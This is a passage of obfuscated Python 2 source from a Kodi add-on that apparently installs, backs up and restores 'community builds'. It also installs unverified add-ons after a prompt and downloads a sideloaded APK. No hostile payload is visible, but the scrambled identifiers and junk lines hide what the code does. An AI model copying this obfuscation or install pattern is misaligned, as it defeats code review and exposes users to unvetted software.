 if 13 - 13: OoO0O00
 if 70 - 70: i1Ii11i1i + O0 . ooOo * OO000
 iIi = open ( OOoOO0oo0ooO , mode = 'r' )
 iiII111iIII1Ii = iIi . read ( )
 iIi . close ( )
 iiO0O0o0oO0O00 = open ( O0o0O00Oo0o0 , mode = 'r' )
 iI1IiiiIiI1Ii = iiO0O0o0oO0O00 . read ( )
 iiO0O0o0oO0O00 . close ( )
 if iiII111iIII1Ii == '' and iI1IiiiIiI1Ii == '' :
  OO0o . ok ( 'No Special Characters Found' , 'Great news, all filenames in the path you scanned are ASCII based - no special characters found.' )
 else :
  Oo000 = open ( OOO00O , mode = 'w+' )
  Oo000 . write ( iiII111iIII1Ii + '\n\n' + iI1IiiiIiI1Ii )
  Oo000 . close ( )
  iiIiII11i1 = open ( OOO00O , mode = 'r' )
  oOo00Ooo0o0 = iiIiII11i1 . read ( )
  iiIiII11i1 . close ( )
  TXT . TXT ( 'Final Results' , oOo00Ooo0o0 )
  os . remove ( OOO00O )
 os . remove ( OOoOO0oo0ooO )
 os . remove ( O0o0O00Oo0o0 )
 if 33 - 33: OooO00OOoO00
 if 87 - 87: OoOoOO00 / oOO00 + iIii1I11I1II1
def oo0O0o ( ) :
 IiII111i1i11 ( '' , '[COLOR=darkcyan][INSTRUCTIONS][/COLOR] How to create and share my build' , '' , 'instructions_1' , '' , '' , '' , 'Back Up Your Full System' )
 IiII111i1i11 ( '' , 'Create [COLOR=orange]noobs[/COLOR][COLOR=dodgerblue]and[/COLOR][COLOR=orange]nerds[/COLOR] Community Build (for sharing on CP)' , 'url' , 'community_backup' , '' , '' , '' , 'Back Up Your Full System' )
 if IioO0O ( ) :
  IiII111i1i11 ( '' , 'Create OpenELEC Backup (full backup can only be used on OpenELEC)' , 'none' , 'openelec_backup' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , '[COLOR=gold]-----------------------------------------------------------------[/COLOR]' , '' , '' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Create Universal Build (very old and dated - not recommended)' , 'none' , 'community_backup_2' , '' , '' , '' , '' )
 IiII111i1i11 ( '' , 'Create Full Backup (will only work on THIS device)' , 'local' , 'local_backup' , '' , '' , '' , 'Back Up Your Full System' )
 IiII111i1i11 ( '' , 'Backup Addons Only' , 'addons' , 'restore_zip' , '' , '' , '' , 'Back Up Your Addons' )
 IiII111i1i11 ( '' , 'Backup Addon Data Only' , 'addon_data' , 'restore_zip' , '' , '' , '' , 'Back Up Your Addon Userdata' )
 IiII111i1i11 ( '' , 'Backup Guisettings.xml' , O000OO0 , 'restore_backup' , '' , '' , '' , 'Back Up Your guisettings.xml' )
 if 79 - 79: OoooooooOO - oOO00 * oOO00 . OoOoOO00
 if os . path . exists ( OOOOi11i1 ) :
  IiII111i1i11 ( '' , 'Backup Favourites.xml' , OOOOi11i1 , 'restore_backup' , 'Backup.png' , '' , '' , 'Back Up Your favourites.xml' )
  if 100 - 100: II111iiii * OooO00OOoO00 % I1IiiI / I1ii11iIi11i
 if os . path . exists ( IIIii1II1II ) :
  IiII111i1i11 ( '' , 'Backup Source.xml' , IIIii1II1II , 'restore_backup' , 'Backup.png' , '' , '' , 'Back Up Your sources.xml' )
  if 90 - 90: I1ii11iIi11i . o0oOOoo . OoOoOO00 . OO000
 if os . path . exists ( i1I1iI ) :
  IiII111i1i11 ( '' , 'Backup Advancedsettings.xml' , i1I1iI , 'restore_backup' , 'Backup.png' , '' , '' , 'Back Up Your advancedsettings.xml' )
  if 4 - 4: OO000 + OoOoOO00 % I1ii11iIi11i / i11iIiiIii
 if os . path . exists ( I11i1I1I ) :
  IiII111i1i11 ( '' , 'Backup Advancedsettings.xml' , I11i1I1I , 'restore_backup' , 'Backup.png' , '' , '' , 'Back Up Your keyboard.xml' )
  if 74 - 74: II111iiii . O0 - I1IiiI + oOO00 % i11iIiiIii % OoOoOO00
 if os . path . exists ( o0OO00oO ) :
  IiII111i1i11 ( '' , 'Backup RssFeeds.xml' , o0OO00oO , 'restore_backup' , 'Backup.png' , '' , '' , 'Back Up Your RssFeeds.xml' )
  if 78 - 78: OO000 + OoOoOO00 + oOO00 - oOO00 . i11iIiiIii / OoO0O00
  if 27 - 27: OO000 - O0 % OooO00OOoO00 * i1Ii11i1i . oOO00 % iIii1I11I1II1
def IiIi1i ( ) :
 IiII111i1i11 ( 'folder' , 'Backup My Content' , 'none' , 'backup_option' , 'Backup.png' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Restore My Content' , 'none' , 'restore_option' , 'Restore.png' , '' , '' , '' )
 if 99 - 99: OoOoOO00 . i1Ii11i1i
 if 59 - 59: OooO00OOoO00 / Oo0Ooo / Oo / O0 / OoOoOO00 + o0oOOo0O0Ooo
def IIiI1111i1 ( ) :
 xbmc . executebuiltin ( 'ActivateWindow(10040,"addons://repos/",return)' )
 if 46 - 46: oOO00
def Ii1 ( ) :
 iII1iii = str ( oOooOOOoOo [ : 2 ] )
 if iII1iii < 14 :
  IIi1IiII = os . path . join ( oooooOoo0ooo , 'xbmc.log' )
  if 65 - 65: oOO00 . i1IIi
 else :
  IIi1IiII = os . path . join ( oooooOoo0ooo , 'kodi.log' )
  if 95 - 95: I1IiiI + I1IiiI - Oo - OOOOOOoo0O
 i1ii1iIIi11i111I = open ( IIi1IiII , 'r' )
 iiiIii = i1ii1iIIi11i111I . read ( )
 i1ii1iIIi11i111I . close ( )
 if 35 - 35: OoooooooOO - i1Ii11i1i / OoO0O00
 iii11i1 = re . compile ( 'Running on (.+?)\n' ) . findall ( iiiIii )
 i1IiI1I111iIi = iii11i1 [ 0 ] if ( len ( iii11i1 ) > 0 ) else ''
 return i1IiI1I111iIi . replace ( ' ' , '%20' )
 if 41 - 41: O0 + ooOo . i1IIi - II111iiii * o0oOOo0O0Ooo . OoO0O00
 if 68 - 68: o0oOOo0O0Ooo
def i11Ii1IIi ( localbuildcheck , localversioncheck , id , welcometext ) :
 if 36 - 36: O0 * OoO0O00 % OOOOOOoo0O * OOOOOOoo0O / OoO0O00 * oOO00
 if 14 - 14: i1IIi . oOO00 + O0 * o0oOOoo
 if 76 - 76: OoO0O00
 if 92 - 92: OooO00OOoO00 - iIii1I11I1II1 % OoooooooOO
 if 39 - 39: OOOOOOoo0O . I1IiiI * OoOoOO00 - i11iIiiIii
 if 1 - 1: OOOOOOoo0O * OoOoOO00
 if id != '0' and id != 'None' :
  if 66 - 66: OoOoOO00 + i1IIi % II111iiii . O0 * I1ii11iIi11i % I1ii11iIi11i
  if id != 'Local' :
   O0oOO0o = iiiiI1IiI1I1 ( localbuildcheck , localversioncheck , id )
   if 19 - 19: OO000
   if O0oOO0o == True :
    if 55 - 55: Oo % Oo / O0 % OOOOOOoo0O - o0oOOo0O0Ooo . Oo0Ooo
    if not 'Partially installed' in localbuildcheck :
     IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue]' + localbuildcheck + ':[/COLOR] [COLOR=lime]NEW VERSION AVAILABLE[/COLOR]' , id , 'showinfo' , '' , '' , '' , '' )
     if 49 - 49: iIii1I11I1II1 * i1IIi . OoooooooOO
    if '(Partially installed)' in localbuildcheck :
     IiII111i1i11 ( 'folder' , '[COLOR=darkcyan]Current Build Installed: [/COLOR][COLOR=dodgerblue]' + localbuildcheck + '[/COLOR]' , id , 'showinfo2' , '' , '' , '' , '' )
   else :
    IiII111i1i11 ( 'folder' , '[COLOR=darkcyan]Current Build Installed: [/COLOR][COLOR=dodgerblue]' + localbuildcheck + '[/COLOR]' , id , 'showinfo' , '' , '' , '' , '' )
    if 90 - 90: o0oOOo0O0Ooo % I1ii11iIi11i - iIii1I11I1II1 % OoOoOO00
  else :
   if 8 - 8: OoOoOO00 * Oo0Ooo / oOO00 % OO000 - I1IiiI
   if localbuildcheck == 'Incomplete' :
    IiII111i1i11 ( '' , '[COLOR=darkcyan]Your last restore is not yet completed[/COLOR]' , 'url' , oo0ooooo00o ( ) , '' , '' , '' , '' )
    if 78 - 78: iIii1I11I1II1 . o0oOOo0O0Ooo % iIii1I11I1II1 . O0 / Oo
   else :
    IiII111i1i11 ( '' , '[COLOR=darkcyan]Current Build Installed: [/COLOR][COLOR=dodgerblue]Local Build (' + localbuildcheck + ')[/COLOR]' , '' , '' , '' , '' , '' , '' )
 Oo0oOo000OoO0 = 0
 if 25 - 25: I1ii11iIi11i . i1IIi . II111iiii / i1Ii11i1i
 if os . path . exists ( o0 ) :
  for oOo00O0oo00o0 in os . listdir ( o0 ) :
   if oOo00O0oo00o0 != 'Master' :
    Oo0oOo000OoO0 += 1
    if 54 - 54: i1IIi . OooO00OOoO00 - I1ii11iIi11i + o0oOOoo + Oo0Ooo / Oo0Ooo
  if Oo0oOo000OoO0 > 1 :
   IiII111i1i11 ( 'folder' , '[COLOR=darkcyan]Switch Build Profile[/COLOR]' , localbuildcheck , 'switch_profile_menu' , '' , '' , '' , '' )
   if 22 - 22: o0oOOoo . iIii1I11I1II1
  IiII111i1i11 ( '' , '[COLOR=orange]---------------------------------------[/COLOR]' , 'None' , '' , '' , '' , '' , '' )
  if 12 - 12: OO000
 if IioO0O ( ) :
  IiII111i1i11 ( '' , '[COLOR=darkcyan]Wi-Fi Settings[/COLOR]' , '' , 'openelec_settings' , 'Wi-Fi.png' , '' , '' , '' )
  if 71 - 71: I1IiiI . II111iiii . I1IiiI - o0oOOoo
 if iI1Ii11111iIi == 'true' :
  if 45 - 45: oOO00 / O0 / OoOoOO00 * Oo
  if i1i1II == 'true' :
   IiIIiiI ( 'yes' )
   if 60 - 60: i1Ii11i1i
  if i1i1II == 'false' :
   IiIIiiI ( 'no' )
   if 98 - 98: o0oOOoo
   if 34 - 34: iIii1I11I1II1 * OooO00OOoO00 * OooO00OOoO00 / I1ii11iIi11i
 IiII111i1i11 ( '' , '[COLOR=dodgerblue]Social TV[/COLOR]' , 'http://tlbb.me/comm.php?z=c&x=' , 'grab_updates' , '' , '' , '' , '' )
 IiII111i1i11 ( 'folder' , 'Install Content' , iii , 'install_content' , 'Search_Addons.png' , '' , '' , '' )
 if 28 - 28: OoO0O00 - ooOo + OoOoOO00 + OO000 / iIii1I11I1II1
 if oo0o0O00 == 'true' :
  IiII111i1i11 ( 'folder' , 'Hardware Reviews' , 'none' , 'hardware_root_menu' , 'hardware.png' , '' , '' , '' )
  if 26 - 26: iIii1I11I1II1 - O0 . O0
 if i1iiIIiiI111 == 'true' :
  IiII111i1i11 ( 'folder' , 'Latest News' , 'none' , 'news_root_menu' , 'LatestNews.png' , '' , '' , '' )
  if 68 - 68: Oo + ooOo . O0 . OO000 % i1IIi % Oo
 if oooOOOOO == 'true' :
  IiII111i1i11 ( 'folder' , 'Tutorials' , '' , 'tutorial_root_menu' , 'TotalXBMC_Guides.png' , '' , '' , '' )
  if 50 - 50: oOO00 + o0oOOo0O0Ooo
 if oO == 'true' :
  IiII111i1i11 ( 'folder' , 'Maintenance' , 'none' , 'tools' , 'Additional_Tools.png' , '' , '' , '' )
  if 96 - 96: OoO0O00
  if 92 - 92: Oo0Ooo / i11iIiiIii + I1ii11iIi11i
def oOo0Oo0O0O ( ) :
 III1II1i = 'defaultskindependecycheck'
 if os . path . exists ( ooOOoooooo ) :
  shutil . rmtree ( ooOOoooooo )
  if 3 - 3: OOOOOOoo0O
 if not os . path . exists ( ooOOoooooo ) :
  os . makedirs ( ooOOoooooo )
  if 35 - 35: oOO00 . O0 + Oo0Ooo + Oo + i1IIi
 III1II1i = i1I1iI1iIi111i ( )
 OooOooO0O0o0 = o0OO0o0o00o ( 'http://noobsandnerds.com/TI/AddonPortal/approved.php' )
 if 59 - 59: Oo0Ooo + OOOOOOoo0O - Oo . o0oOOo0O0Ooo + I1IiiI % ooOo
 Ooo . create ( 'Backing Up Add-ons' , '' , 'Please Wait...' )
 if 37 - 37: OOOOOOoo0O + OOOOOOoo0O % o0oOOo0O0Ooo
 for oOo00O0oo00o0 in os . listdir ( ooooooO0oo ) :
  if 29 - 29: o0oOOoo
  if 41 - 41: O0 % OOOOOOoo0O
  if not 'totalinstaller' in oOo00O0oo00o0 and not 'plugin.program.tbs' in oOo00O0oo00o0 and not 'packages' in oOo00O0oo00o0 and not 'repo.' in oOo00O0oo00o0 and not 'repository' in oOo00O0oo00o0 and os . path . isdir ( os . path . join ( ooooooO0oo , oOo00O0oo00o0 ) ) :
   if 10 - 10: OOOOOOoo0O . i1IIi + OO000
   if 66 - 66: OoO0O00 % o0oOOo0O0Ooo
   if oOo00O0oo00o0 in OooOooO0O0o0 and not oOo00O0oo00o0 in III1II1i and not 'repo.' in oOo00O0oo00o0 and not 'repository.' in oOo00O0oo00o0 and os . path . isdir ( os . path . join ( ooooooO0oo , oOo00O0oo00o0 ) ) :
    if 21 - 21: OoOoOO00 - OoooooooOO % i11iIiiIii
    if 71 - 71: i1IIi - OooO00OOoO00 * i1Ii11i1i + ooOo - OoO0O00 % I1ii11iIi11i
    if not 'service.xbmc.versioncheck' in oOo00O0oo00o0 and not 'packages' in oOo00O0oo00o0 and os . path . isdir ( os . path . join ( ooooooO0oo , oOo00O0oo00o0 ) ) :
     if 63 - 63: iIii1I11I1II1 + Oo . OoO0O00 / I1IiiI
     try :
      Ooo . update ( 0 , "Backing Up" , '[COLOR darkcyan]%s[/COLOR]' % oOo00O0oo00o0 , 'Please Wait...' )
      os . makedirs ( os . path . join ( ooOOoooooo , oOo00O0oo00o0 ) )
      if 84 - 84: i1IIi
      OOOOOoOO0OOoo = os . path . join ( ooOOoooooo , oOo00O0oo00o0 , 'addon.xml' )
      IIIi11IiIiii = os . path . join ( ooOOoooooo , oOo00O0oo00o0 , 'default.py' )
      Oo00O0ooOO = open ( os . path . join ( ooooooO0oo , oOo00O0oo00o0 , 'addon.xml' ) , mode = 'r' )
      IiiI = Oo00O0ooOO . read ( )
      Oo00O0ooOO . close ( )
      if 42 - 42: II111iiii - OoO0O00 - OoooooooOO . OOOOOOoo0O / OoOoOO00
      IIOO0ooOo0OoOo0 = re . compile ( ' name="(.+?)"' ) . findall ( IiiI )
      oOoi1i = re . compile ( 'provider-name="(.+?)"' ) . findall ( IiiI )
      ooooo0Oo0 = re . compile ( '<addon[\s\S]*?">' ) . findall ( IiiI )
      o0I1IIIi11ii11 = re . compile ( '<description[\s\S]*?<\/description>' ) . findall ( IiiI )
      I11IIIi = IIOO0ooOo0OoOo0 [ 0 ] if ( len ( IIOO0ooOo0OoOo0 ) > 0 ) else 'None'
      IIii1111 = oOoi1i [ 0 ] if ( len ( oOoi1i ) > 0 ) else 'Anonymous'
      O0o0oo0oOO0oO = ooooo0Oo0 [ 0 ] if ( len ( ooooo0Oo0 ) > 0 ) else 'None'
      ooo00Ooo = o0I1IIIi11ii11 [ 0 ] if ( len ( o0I1IIIi11ii11 ) > 0 ) else 'None'
      if 15 - 15: OoO0O00 * II111iiii
      o0oO00 = '<addon id="' + oOo00O0oo00o0 + '" name="' + I11IIIi + '" version="0" provider-name="' + IIii1111 + '">'
      IiIi11Iii = '<description>If you\'re seeing this message it means the add-on is still updating, please wait for the update process to complete.</description>'
      if 88 - 88: OooO00OOoO00 + i11iIiiIii % ooOo * Oo * Oo * OO000
      if O0o0oo0oOO0oO != 'None' :
       iiiI1i11Ii = IiiI . replace ( ooo00Ooo , IiIi11Iii ) . replace ( O0o0oo0oOO0oO , o0oO00 )
       if 24 - 24: o0oOOoo / OOOOOOoo0O + oOO00 . oOO00
      else :
       iiiI1i11Ii = IiiI . replace ( ooo00Ooo , IiIi11Iii )
       if 39 - 39: o0oOOoo + O0 / i1IIi % oOO00 / ooOo * oOO00
      oo00IIIIIIIiI = open ( OOOOOoOO0OOoo , mode = 'w+' )
      oo00IIIIIIIiI . write ( str ( iiiI1i11Ii ) )
      oo00IIIIIIIiI . close ( )
      OO0oOOo0o = open ( IIIi11IiIiii , mode = 'w+' )
      OO0oOOo0o . write ( 'import xbmcplugin,xbmcgui,xbmc,xbmcaddon,os,sys\nAddonID="' + oOo00O0oo00o0 + '"\nAddonName="' + I11IIIi + '"\ndialog=xbmcgui.Dialog()\ndialog.ok(AddonName+" Add-on Requires Update","This add-on may still be in the process of the updating so we recommend waiting a few minutes to see if it updates naturally. If it hasn\'t updated after 5mins please try reinstalling via the Maintenance add-on")\nxbmcplugin.endOfDirectory(int(sys.argv[1]))' )
      OO0oOOo0o . close ( )
      if 77 - 77: oOO00 . i1Ii11i1i % OoOoOO00
     except :
      print "### Failed to backup: " + oOo00O0oo00o0
      if 42 - 42: oOO00 % OOOOOOoo0O % o0oOOo0O0Ooo % ooOo + OooO00OOoO00 % OoOoOO00
      if 3 - 3: ooOo
   else :
    try :
     shutil . copytree ( os . path . join ( ooooooO0oo , oOo00O0oo00o0 ) , os . path . join ( ooOOoooooo , oOo00O0oo00o0 ) )
    except :
     print "### Failed to copy: " + oOo00O0oo00o0
     if 64 - 64: OoO0O00 . I1IiiI - OoooooooOO . o0oOOoo - OOOOOOoo0O
 Ooo . close ( )
 if 77 - 77: OO000 % OoOoOO00 / II111iiii % OOOOOOoo0O % OoooooooOO % OoO0O00
 I1i11II11i1iI = "Creating Backup"
 iI1 = "Archiving..."
 I1I1i1i = ""
 OOo0O = "Please Wait"
 if 100 - 100: OoO0O00 % OoO0O00
 IIiIiII ( ooOOoooooo , II1I , I1i11II11i1iI , iI1 , I1I1i1i , OOo0O , '' , '' )
 if 15 - 15: ooOo / i1Ii11i1i
 try :
  shutil . rmtree ( ooOOoooooo )
  if 37 - 37: i11iIiiIii + I1IiiI . Oo % OooO00OOoO00 % OooO00OOoO00
 except :
  print "### COMMUNITY BUILDS: Failed to remove temp addons folder - manual delete required ###"
  if 26 - 26: O0
  if 34 - 34: o0oOOoo * i1Ii11i1i
def OooOoOO0OO ( url ) :
 Ooo . create ( 'Cleaning Temp Paths' , '' , 'Please wait...' )
 if os . path . exists ( ooOOoooooo ) :
  shutil . rmtree ( ooOOoooooo )
  if 27 - 27: oOO00 * I1IiiI . iIii1I11I1II1 - iIii1I11I1II1
 if not os . path . exists ( ooOOoooooo ) :
  os . makedirs ( ooOOoooooo )
  if 5 - 5: oOO00
 extract . all ( II1I , ooOOoooooo )
 OooOooO0O0o0 = o0OO0o0o00o ( 'http://noobsandnerds.com/TI/AddonPortal/approved.php' )
 oo00IIIIIIIiI = open ( i1Oo00 , mode = 'w+' )
 oo00IIIIIIIiI . write ( '[COLOR=dodgerblue][B]' + url + '[/B][/COLOR] - Install results[CR][CR][COLOR=darkcyan]IMPORTANT INFORMATION:[/COLOR][CR]Only content avaialable on the official Kodi repo and marked as approved will be installed via the Community Builds function. Please check the details below to see what was successfully installed and what was not. We realise some content may only be unlawful in certain countries so if you have the relevant repositories installed prior to installing a build then all the build content will install.[CR][CR][COLOR=dodgerblue]INSTALL REPORT:[/COLOR][CR]' )
 if 84 - 84: II111iiii * ooOo * II111iiii % oOO00 / I1IiiI
 for oOo00O0oo00o0 in os . listdir ( ooOOoooooo ) :
  if 100 - 100: oOO00 . OO000 - iIii1I11I1II1 . i11iIiiIii / II111iiii
  if not 'totalinstaller' in oOo00O0oo00o0 and not 'plugin.program.tbs' in oOo00O0oo00o0 and not 'packages' in oOo00O0oo00o0 and not 'repo.' in oOo00O0oo00o0 and not 'repository' in oOo00O0oo00o0 :
   if 71 - 71: i1Ii11i1i * Oo0Ooo . OooO00OOoO00
   if oOo00O0oo00o0 in OooOooO0O0o0 :
    i1ii1iiIi1II = re . compile ( 'i="' + oOo00O0oo00o0 + '"r="(.+?)"' ) . findall ( OooOooO0O0o0 )
    OOo000o0 = i1ii1iiIi1II [ 0 ] if ( len ( i1ii1iiIi1II ) > 0 ) else 'None'
    if 69 - 69: o0oOOoo - OoooooooOO * O0
    if os . path . exists ( os . path . join ( ooooooO0oo , OOo000o0 ) ) or OOo000o0 == 'repository.xbmc.org' and not 'metadata' in oOo00O0oo00o0 :
     if 84 - 84: o0oOOoo + i11iIiiIii - Oo * o0oOOoo
     if not os . path . exists ( os . path . join ( ooooooO0oo , oOo00O0oo00o0 ) ) :
      os . rename ( os . path . join ( ooOOoooooo , oOo00O0oo00o0 ) , os . path . join ( ooooooO0oo , oOo00O0oo00o0 ) )
      print "### Successfully installed: " + oOo00O0oo00o0
      oo00IIIIIIIiI . write ( '[COLOR=lime][SUCCESS][/COLOR] ' + oOo00O0oo00o0 + '[CR]' )
      if 33 - 33: o0oOOoo % i1IIi - ooOo . O0 / O0
     else :
      print "### " + oOo00O0oo00o0 + " Already exists on system"
      if 96 - 96: OoooooooOO + oOO00 * O0
    if OOo000o0 != "repository.xbmc.org" and not os . path . exists ( os . path . join ( ooooooO0oo , OOo000o0 ) ) :
     print "### Cannot install " + oOo00O0oo00o0 + " - you need the following repo pre-installed: " + OOo000o0
     oo00IIIIIIIiI . write ( '[COLOR=red][FAILED][/COLOR] ' + oOo00O0oo00o0 + " - you need the following repo pre-installed: [COLOR=darkcyan]" + OOo000o0 + '[CR][/COLOR]' )
     if 86 - 86: OO000
   else :
    if 29 - 29: iIii1I11I1II1 - OoO0O00 + I1IiiI % iIii1I11I1II1 % Oo
    if not os . path . exists ( os . path . join ( ooooooO0oo , oOo00O0oo00o0 ) ) :
     iIiI1 = OO0o . yesno ( '[COLOR=darkcyan]Unknown Add-on Detected[/COLOR]' , 'This build contains content that can\'t be verified' , 'against the Addon Portal. Would you like to install:[COLOR=dodgerblue]' , oOo00O0oo00o0 + '[/COLOR]' )
     if 84 - 84: oOO00 + I1ii11iIi11i + OO000 + OOOOOOoo0O
     if iIiI1 == 1 :
      os . rename ( os . path . join ( ooOOoooooo , oOo00O0oo00o0 ) , os . path . join ( ooooooO0oo , oOo00O0oo00o0 ) )
      print "### Successfully installed: " + oOo00O0oo00o0
      oo00IIIIIIIiI . write ( '[COLOR=lime][SUCCESS][/COLOR] ' + oOo00O0oo00o0 + " - [COLOR=darkcyan]This could not be verified but you accepted to install.[/COLOR][CR]" )
      if 62 - 62: i11iIiiIii + OoOoOO00 + i1IIi
     else :
      print "### " + oOo00O0oo00o0 + " Not installed"
      oo00IIIIIIIiI . write ( '[COLOR=red][FAILED][/COLOR] ' + oOo00O0oo00o0 + " - [COLOR=darkcyan]This could not be verified and you chose not to instsall.[/COLOR][CR]" )
    else :
     print "### " + oOo00O0oo00o0 + " Already exists on system"
     if 69 - 69: OoOoOO00
 oo00IIIIIIIiI . close ( )
 if 63 - 63: OoO0O00 / OoOoOO00 * iIii1I11I1II1 . i1Ii11i1i
 if 85 - 85: i11iIiiIii / i11iIiiIii . OoO0O00 . O0
def OooOo ( ) :
 oOo0I1Ii11i = open ( i1Oo00 , mode = 'r' )
 iiII111iIII1Ii = oOo0I1Ii11i . read ( )
 oOo0I1Ii11i . close ( )
 TXT . TXT ( 'Community Build Install Results' , iiII111iIII1Ii )
 if 19 - 19: oOO00 - o0oOOo0O0Ooo . iIii1I11I1II1 . OoOoOO00 / Oo
 if 87 - 87: OoOoOO00 - o0oOOoo - Oo + Oo0Ooo % iIii1I11I1II1 / i11iIiiIii
def i1iIIII1iiIIi ( welcometext ) :
 i1I1IiI1ii ( 'disclaimer.xml' )
 IiII111i1i11 ( 'folder' , 'I have read and understand the disclaimer.' , 'welcome' , 'CB_Menu' , 'Community_Builds.png' , '' , '' , '' )
 if 64 - 64: OOOOOOoo0O * I1ii11iIi11i % II111iiii - OoOoOO00 + I1ii11iIi11i
 if 62 - 62: OoOoOO00 % o0oOOo0O0Ooo % I1IiiI + oOO00 . OoO0O00
def iI1iiiIii1II1 ( welcometext ) :
 if xbmc . getCondVisibility ( 'system.platform.android' ) :
  i1IIi1i1Ii1 = i11i111IiI ( )
  o0000 = os . path . join ( i1IIi1i1Ii1 , 'Download' )
  try :
   if not os . path . exists ( o0000 ) :
    os . makedirs ( o0000 )
  except :
   print "### Failed to make download folder"
   if 74 - 74: OOOOOOoo0O % II111iiii - Oo % OoooooooOO . ooOo
  if not os . path . exists ( '/data/data/com.rechild.advancedtaskkiller' ) :
   iIiI1 = OO0o . yesno ( 'Advanced Task Killer Required' , 'To be able to us features such as the backup/restore and community builds you need the Advanced Task Killer app installed. Would you like to download it now?' )
   if iIiI1 == 1 :
    Ooo . create ( 'Downloading APK file' , '' , '' , '' )
    try :
     downloader . download ( 'https://archive.org/download/com.rechild.advancedtaskkiller/com.rechild.advancedtaskkiller.apk' , os . path . join ( o0000 , 'AdvancedTaskKiller.apk' ) )
     OO0o . ok ( 'Download Complete' , "The apk file has now been downloaded, you'll find this in your downloads folder. Just install this exactly the same as you would any other apk file - click on it and then click through the setup screen. The file is called AdvancedTaskKiller.apk" )
    except :
     try :
      downloader . download ( 'https://archive.org/download/com.rechild.advancedtaskkiller/com.rechild.advancedtaskkiller.apk' , os . path . join ( 'storage' , 'emulated' , 'legacy' , 'Download' , 'AdvancedTaskKiller.apk' ) )
      OO0o . ok ( 'Download Complete' , "The AdvancedTaskKiller.apk file has now been downloaded, you'll find this in your downloads folder. You'll need a File Manager app to install this file, we recommend installing ES File Explorer - just do a search for this on your box/stick." )
     except :
      OO0o . ok ( 'Download Failed' , 'It wasn\'t possible to download the Advanced Task Killer, without it you will almost certainly run into problems so make sure you get it installed otherwise you\'ll need to manually force close and switching profiles may fail.' )
      if 11 - 11: I1IiiI * i11iIiiIii / i11iIiiIii
      if 89 - 89: OOOOOOoo0O . i11iIiiIii * O0
 oOooOOOoOo = xbmc . getInfoLabel ( "System.BuildVersion" )
 Iiii1 = float ( oOooOOOoOo [ : 2 ] )
 iII1iii = int ( Iiii1 )
 if 27 - 27: Oo
 if iI1Ii11111iIi == 'true' :
  if 52 - 52: i1Ii11i1i % OoOoOO00 + iIii1I11I1II1 * ooOo . OO000
  if i1i1II == 'true' :
   IiIIiiI ( 'yes' )
   if 95 - 95: iIii1I11I1II1 . oOO00 - OoooooooOO * OoO0O00 / o0oOOo0O0Ooo
  if i1i1II == 'false' :
   IiIIiiI ( 'no' )
   if 74 - 74: ooOo
 if IiII == 'true' :
  IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue]Show My Private List[/COLOR]' , '&visibility=private' , 'grab_builds' , 'Private_builds.png' , '' , '' , '' )
  if 34 - 34: OOOOOOoo0O
 if ( iII1iii < 14 ) or ( i11 == 'true' ) :
  IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue]Show All Gotham Compatible Builds[/COLOR]' , '&xbmc=gotham&visibility=public' , 'grab_builds' , 'TRCOMMUNITYGOTHAMBUILDS.png' , '' , '' , '' )
  if 44 - 44: i1IIi % I1IiiI % o0oOOo0O0Ooo
 if ( iII1iii == 14 ) or ( i11 == 'true' ) :
  IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue]Show All Helix Compatible Builds[/COLOR]' , '&xbmc=helix&visibility=public' , 'grab_builds' , 'TRCOMMUNITYHELIXBUILDS.png' , '' , '' , '' )
  if 9 - 9: Oo0Ooo % OoooooooOO - OO000
 if ( iII1iii == 15 ) or ( i11 == 'true' ) :
  IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue]Show All Isengard Compatible Builds[/COLOR]' , '&xbmc=isengard&visibility=public' , 'grab_builds' , 'TRCOMMUNITYHELIXBUILDS.png' , '' , '' , '' )
 if ( iII1iii == 16 ) or ( i11 == 'true' ) :
  IiII111i1i11 ( 'folder' , '[COLOR=dodgerblue]Show All Jarvis Compatible Builds[/COLOR]' , '&xbmc=jarvis&visibility=public' , 'grab_builds' , 'TRCOMMUNITYHELIXBUILDS.png' , '' , '' , '' )
 if iI111I11I1I1 != '' :
  IiII111i1i11 ( 'folder' , '[COLOR=darkcyan]Show ' + OOooO0OOoo + ' Builds[/COLOR]' , '&id=1' , 'grab_builds' , 'TRCOMMUNITYGOTHAMBUILDS.png' , '' , '' , '' )
 if iIii1 != '' :
  IiII111i1i11 ( 'folder' , '[COLOR=darkcyan]Show ' + oOOoO0 + ' Builds[/COLOR]' , '&id=2' , 'grab_builds' , 'TRCOMMUNITYGOTHAMBUILDS.png' , '' , '' , '' )
 if O0OoO000O0OO != '' :
  IiII111i1i11 ( 'folder' , '[COLOR=darkcyan]Show ' + iiI1IiI + ' Builds[/COLOR]' , '&id=3' , 'grab_builds' , 'TRCOMMUNITYGOTHAMBUILDS.png' , '' , '' , '' )
 if II != '' :
  IiII111i1i11 ( 'folder' , '[COLOR=darkcyan]Show ' + ooOoOoo0O + ' Builds[/COLOR]' , '&id=4' , 'grab_builds' , 'TRCOMMUNITYGOTHAMBUILDS.png' , '' , '' , '' )
 if OooO0 != '' :
  IiII111i1i11 ( 'folder' , '[COLOR=darkcyan]Show ' + II11iiii1Ii + ' Builds[/COLOR]' , '&id=5' , 'grab_builds' , 'TRCOMMUNITYGOTHAMBUILDS.png' , '' , '' , '' )
  if 43 - 43: OoO0O00 % OoO0O00
 IiII111i1i11 ( '' , 'Create My Own Community Build' , 'url' , 'community_backup' , 'Backup.png' , '' , '' , 'Back Up Your Full System' )
 if 46 - 46: Oo0Ooo % iIii1I11I1II1 . OOOOOOoo0O . O0 * o0oOOoo / OoooooooOO
 if os . path . exists ( i1Oo00 ) :
  IiII111i1i11 ( '' , 'View Results Of Previous Community Build Install' , '' , 'cb_install_results' , 'View_Log.png' , '' , '' , 'Community Build install results. Find out what installed and what didn\'t with details of why.' )
  if 7 - 7: ooOo - O0 * OooO00OOoO00 - o0oOOo0O0Ooo - II111iiii
  if 41 - 41: I1IiiI - i1Ii11i1i % II111iiii . i1Ii11i1i - OooO00OOoO00
def i1I111Ii ( skin ) :
 i11i1i = '<onleft>%s</onleft>'
 I1ii1Ii1 = '<onright>%s</onright>'
 OoO = '<onup>%s</onup>'
 oOiI111I1III = '<ondown>%s</ondown>'
 i111IiiI1Ii = '<control type="button" id="%s">'
